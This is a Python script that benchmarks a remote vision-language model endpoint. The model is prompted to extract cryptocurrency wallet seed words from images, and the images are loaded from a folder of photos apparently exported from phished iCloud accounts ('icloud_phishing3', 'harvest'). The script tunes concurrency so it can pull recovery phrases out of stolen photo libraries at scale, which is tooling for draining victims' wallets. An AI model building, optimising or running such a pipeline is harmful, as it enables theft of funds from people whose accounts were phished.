import base64, io, json, threading, time, requests
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from PIL import Image, ImageOps

import sys
URL=sys.argv[1] if len(sys.argv)>1 else 'https://zo0dbb24aajxip-8000.proxy.runpod.net/v1/chat/completions'
MODEL=sys.argv[2] if len(sys.argv)>2 else 'Qwen/Qwen3-VL-8B-Instruct'
P=("Extract the seed words from this image.\n- If the words are numbered: output one line per word as '<number> <word>'.\n"
   "- If they are NOT numbered: output 'COLUMNS: <n>' on the first line, then every word in row order.\nOutput only that.")
local=threading.local()
def sess():
    if not hasattr(local,'s'): local.s=requests.Session()
    return local.s

def encode(p, side):
    im=Image.open(p); im=ImageOps.exif_transpose(im) or im; im=im.convert('RGB'); im.thumbnail((side,side))
    b=io.BytesIO(); im.save(b,'JPEG',quality=90)
    return base64.b64encode(b.getvalue()).decode(), im.size

def body(b64):
    return {"model":MODEL,"temperature":0,"max_tokens":400,
            "messages":[{"role":"user","content":[{"type":"text","text":P},
            {"type":"image_url","image_url":{"url":"data:image/jpeg;base64,"+b64}}]}]}

def call(b64, use_session=True):
    t=time.perf_counter()
    r=(sess() if use_session else requests).post(URL,json=body(b64),timeout=180)
    d=r.json()
    return (time.perf_counter()-t)*1000, d.get('usage',{}).get('prompt_tokens')

def bench(payloads, workers, use_session=True):
    t0=time.perf_counter()
    with ThreadPoolExecutor(max_workers=workers) as ex:
        out=list(ex.map(lambda b: call(b,use_session), payloads))
    dt=time.perf_counter()-t0
    lat=[o[0] for o in out]; tok=[o[1] for o in out if o[1]]
    return dt, len(payloads)/dt, sum(lat)/len(lat), (sum(tok)/len(tok) if tok else 0)

files=[p for p in Path('/home/pc/Desktop/tools/ia_projects/pges/icloud_phishing3/export/example.harvest@icloud.com/Photos/Library').glob('*') if p.suffix.lower() in ('.png','.jpg','.jpeg')][:16]
print('images',len(files))
for side in (1024,):
    t=time.perf_counter(); enc=[encode(p,side) for p in files]; enc_ms=(time.perf_counter()-t)*1000
    b64=[e[0] for e in enc]; sizes=[e[1] for e in enc]
    print(f"\nside {side}: encode {enc_ms/len(files):.0f} ms/img, avg px {sum(w*h for w,h in sizes)//len(sizes)}")
    for w in (1,4,8,16):
        dt, ips, lat, tok = bench(b64, w)
        print(f"  pre-encoded  concurrency {w:2d}: {ips:5.2f} img/s  lat {lat:6.0f} ms  tokens {tok:.0f}")
    dt, ips, lat, tok = bench(b64, 8, use_session=False)
    print(f"  no keep-alive concurrency  8: {ips:5.2f} img/s  lat {lat:6.0f} ms")
